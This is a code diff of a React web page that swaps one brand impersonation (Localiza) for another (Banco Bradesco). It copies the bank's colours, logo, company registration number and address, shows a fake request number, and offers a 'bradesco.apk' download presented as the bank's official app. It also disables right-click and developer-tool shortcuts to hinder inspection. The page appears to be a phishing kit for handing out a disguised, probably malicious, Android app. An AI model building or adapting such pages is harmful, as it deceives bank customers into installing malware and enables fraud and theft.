@@ -4,10 +4,10 @@ import { useState, useEffect } from "react";
 
 export default function Home() {
   const banners = [
-    "/MO_25_1194_COMECO_DE_ANO_BANNER-SITE-RAC_1920x616-1.jpg",
-    "/RAC_26_1234_AM_DESCONTO_PROGRESSIVO_banner-1920x616-1.png",
-    "/RAC_26_1267_BANNER_PROGRAMA_FIDELIDADE_1920x616-1.png",
-    "/SN_25_1088_CAMPANHA-MENSAL-DEZEMBRO-Bsnner-RAC-1920x616px_.png",
+    "/Banner bradesco01 .webp",
+    "/Banner bradesco02 .webp",
+    "/Banner bradesco03 .webp",
+    "/Banner bradesco04 .webp",
   ];
 
   const [currentBanner, setCurrentBanner] = useState(0);
@@ -31,32 +31,37 @@ export default function Home() {
     const handleKeyDown = (e: KeyboardEvent) => {
       // Desabilitar F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
       if (
-        e.key === 'F12' ||
-        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
-        (e.ctrlKey && e.key === 'U')
+        e.key === "F12" ||
+        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) ||
+        (e.ctrlKey && e.key === "U")
       ) {
         e.preventDefault();
         return false;
       }
     };
 
-    document.addEventListener('contextmenu', handleContextMenu);
-    document.addEventListener('keydown', handleKeyDown);
+    document.addEventListener("contextmenu", handleContextMenu);
+    document.addEventListener("keydown", handleKeyDown);
 
     return () => {
-      document.removeEventListener('contextmenu', handleContextMenu);
-      document.removeEventListener('keydown', handleKeyDown);
+      document.removeEventListener("contextmenu", handleContextMenu);
+      document.removeEventListener("keydown", handleKeyDown);
     };
   }, []);
 
   return (
     <div className="min-h-screen flex flex-col">
       {/* Header com Logo */}
-      <header className="bg-[#01602a] shadow-sm py-3 sm:py-4 px-4 sm:px-6">
+      <header
+        className="shadow-sm py-3 sm:py-4 px-4 sm:px-6"
+        style={{
+          background: "linear-gradient(90deg, #cc092f 40%, #b81570 90%)",
+        }}
+      >
         <div className="max-w-6xl mx-auto flex items-center justify-center sm:justify-start">
           <img
-            src="/localiza-logo.svg"
-            alt="Localiza"
+            src="/logo-mobile.png"
+            alt="Bradesco"
             className="h-6 sm:h-8 md:h-10"
           />
         </div>
@@ -66,7 +71,12 @@ export default function Home() {
       <main className="flex-1 flex items-center justify-center px-3 sm:px-4 py-6 sm:py-12">
         <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg border border-gray-200 max-w-4xl w-full p-4 sm:p-6 md:p-8 lg:p-12">
           {/* Título e Status */}
-          <div className="bg-[#01602a] text-white px-4 sm:px-6 py-4 sm:py-5 -mx-4 -mt-4 sm:-mx-6 sm:-mt-6 md:-mx-8 md:-mt-8 lg:-mx-12 lg:-mt-12 rounded-t-xl sm:rounded-t-2xl mb-6 sm:mb-8">
+          <div
+            className="text-white px-4 sm:px-6 py-4 sm:py-5 -mx-4 -mt-4 sm:-mx-6 sm:-mt-6 md:-mx-8 md:-mt-8 lg:-mx-12 lg:-mt-12 rounded-t-xl sm:rounded-t-2xl mb-6 sm:mb-8"
+            style={{
+              background: "linear-gradient(90deg, #cc092f 40%, #b81570 90%)",
+            }}
+          >
             <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
               <h1 className="text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold leading-tight">
                 Solicitação N° 61515712
@@ -102,7 +112,7 @@ export default function Home() {
           <div className="mb-6 sm:mb-8 relative rounded-lg sm:rounded-xl overflow-hidden">
             <img
               src={banners[currentBanner]}
-              alt={`Banner Localiza ${currentBanner + 1}`}
+              alt={`Banner Bradesco ${currentBanner + 1}`}
               className="w-full h-auto object-contain bg-gradient-to-r from-green-50 to-blue-50"
             />
           </div>
@@ -110,7 +120,7 @@ export default function Home() {
           {/* Seção de Acompanhamento */}
           <div className="bg-gradient-to-r from-green-50 to-blue-50 rounded-lg sm:rounded-xl p-4 sm:p-6 mb-4 sm:mb-6 border-2 border-dashed border-gray-300">
             <div className="flex flex-col items-center justify-center gap-3 mb-3 sm:mb-4">
-              <div className="flex-shrink-0 w-16 h-16 sm:w-20 sm:h-20 bg-green-500 rounded-xl flex items-center justify-center shadow-lg">
+              <div className="flex-shrink-0 w-16 h-16 sm:w-20 sm:h-20 bg-[#cc092f] rounded-xl flex items-center justify-center shadow-lg">
                 <svg
                   className="w-9 h-9 sm:w-11 sm:h-11 text-white"
                   fill="none"
@@ -126,20 +136,20 @@ export default function Home() {
                 </svg>
               </div>
               <h4 className="text-lg sm:text-xl md:text-2xl font-bold text-gray-800 text-center">
-                Aplicativo da Localiza Seminovos
+                Aplicativo do Bradesco
               </h4>
             </div>
             <p className="text-sm sm:text-base text-gray-700 text-center mb-4 sm:mb-6 leading-relaxed px-2">
-              Baixe o aplicativo da Localiza Seminovos para acompanhar as
-              atualizações da sua solicitação.
+              Baixe o aplicativo do Bradesco para acompanhar as atualizações da
+              sua solicitação.
             </p>
 
             {/* Botão de Download Principal */}
             <div className="flex justify-center">
               <a
-                href="/localiza.apk"
-                download="localiza.apk"
-                className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold py-3 sm:py-4 px-6 sm:px-8 rounded-lg shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-200 flex items-center justify-center gap-2 sm:gap-3 text-sm sm:text-base md:text-lg touch-manipulation w-full sm:w-auto text-center"
+                href="/bradesco.apk"
+                download="bradesco.apk"
+                className="bg-[#cc092f] hover:bg-[#a00725] text-white font-bold py-3 sm:py-4 px-6 sm:px-8 rounded-lg shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-200 flex items-center justify-center gap-2 sm:gap-3 text-sm sm:text-base md:text-lg touch-manipulation w-full sm:w-auto text-center"
               >
                 <svg
                   className="w-5 h-5 sm:w-6 sm:h-6 flex-shrink-0"
@@ -182,22 +192,33 @@ export default function Home() {
       </main>
 
       {/* Footer */}
-      <footer className="bg-[#01602a] text-white py-8 sm:py-12 px-4">
+      <footer
+        className="text-white py-8 sm:py-12 px-4"
+        style={{
+          background: "linear-gradient(90deg, #cc092f 40%, #b81570 90%)",
+        }}
+      >
         <div className="max-w-6xl mx-auto">
           <div className="flex flex-col items-center gap-6 sm:gap-8">
             {/* Logo */}
             <div>
               <img
-                src="/localiza-logo.svg"
-                alt="Localiza"
+                src="/logo-mobile.png"
+                alt="Bradesco"
                 className="h-8 sm:h-10"
               />
             </div>
 
-            {/* Copyright */}
-            <div className="text-center">
+            {/* Copyright e Informações */}
+            <div className="text-center space-y-2">
               <p className="text-xs sm:text-sm text-white/80">
-                © 2026 Localiza. Todos os direitos reservados.
+                © 2026 Bradesco. Todos os direitos reservados.
+              </p>
+              <p className="text-xs sm:text-sm text-white/70">
+                Banco Bradesco SA | CNPJ: 60.746.948.0001-12
+              </p>
+              <p className="text-xs sm:text-sm text-white/70">
+                Cidade de Deus, s/nº Vila Yara | Osasco | SP | CEP: 06029-900
               </p>
             </div>
           </div>
